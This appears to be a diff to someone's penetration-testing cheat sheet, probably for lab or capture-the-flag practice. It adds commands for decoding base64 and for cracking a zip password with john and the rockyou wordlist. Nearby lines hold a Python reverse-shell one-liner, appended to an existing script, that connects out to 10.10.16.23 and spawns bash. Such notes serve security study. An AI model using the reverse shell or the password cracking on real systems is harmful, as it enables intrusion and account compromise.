@@ -50,7 +50,12 @@ Enumerating SMB: https://infinitelogins.com/2020/06/17/enumerating-smb-for-pente
 			- sudo nano /etc/samba/smb.conf
 			- Under Global: client min protocol = LANMAN1
 
+Decoding a base64 file: cat myplace.backup | base64 -d > results
 
+Cracking a zip file with a pssword: 
+	- zip2john results.zip > hash.txt
+	- john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
+	
 Adding code to an exisisting script/program on Linux: 
 
 	- python reverseshell example: echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.23",1336));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' >> tmp.py
